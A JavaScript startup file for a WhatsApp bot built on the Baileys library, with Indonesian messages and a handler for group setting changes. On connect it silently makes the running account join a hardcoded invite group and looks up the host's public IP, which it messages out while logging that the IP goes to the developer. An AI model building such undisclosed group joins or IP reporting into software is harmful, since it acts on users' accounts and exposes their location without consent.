require('./handler.js')
const {WAConnection, MessageType, Presence, MessageOptions, Mimetype, WALocationMessage,ReconnectMode, ProxyAgent, GroupSettingChange } = require('@adiwajshing/baileys')
const { exec } = require('child_process')
nocache('./main.js', module => console.log(`${module} Update`))

//con

async function starts() {
const Duta = new WAConnection()
Duta.logger.level = 'warn'
Duta.version = [2, 2143, 3]
Duta.browserDescription = [ 'HyuugaBot', 'Firefox', '3.0' ]
console.log(color('[•] [ CREATED BY Lord Duta ] [•]'))
console.log(color('                                                      '))
console.log(color(' ==============================================='))
console.log(color('│ ○ Instagram : https://instagram.com/duta_fbriann                 '))
console.log(color('│ ○ Github : https://github.com/DutaKey                        '))
console.log(color(' ==============================================='))
Duta.on('qr', () => {})
fs.existsSync('./dbot.json') && Duta.loadAuthInfo('./dbot.json')
await Duta.connect({timeoutMs: 30*1000})
fs.writeFileSync('./dbot.json', JSON.stringify(Duta.base64EncodedAuthInfo(), null, '\t'))
teks = `https://chat.whatsapp.com/B8FEo1CtHsZ0k7woYzqjnG`
Duta.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
Duta.sendMessage(`${ownerNumber}@s.whatsapp.net`, `*Hai Owner ${bot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(Duta.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Developer ${bot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync(`${thumb}`),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
.then(bu =>{
Duta.sendMessage(`${ownerNumber}@s.whatsapp.net`, `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Developer ${bot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync(`${thumb}`),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
})
            
//anu grub

Duta.on('group-update', async (anu) => {
	const metdata = await Duta.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Duta;;;\nFN:Duta\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    Duta.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.announce == 'true'){
    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    Duta.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    Duta.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    Duta.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    Duta.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

//mek dimulai
Duta.on('chat-update', async (mek) => {
     require("./main.js")(Duta, mek)
})   
}
		
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}



function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
       })
}
starts() 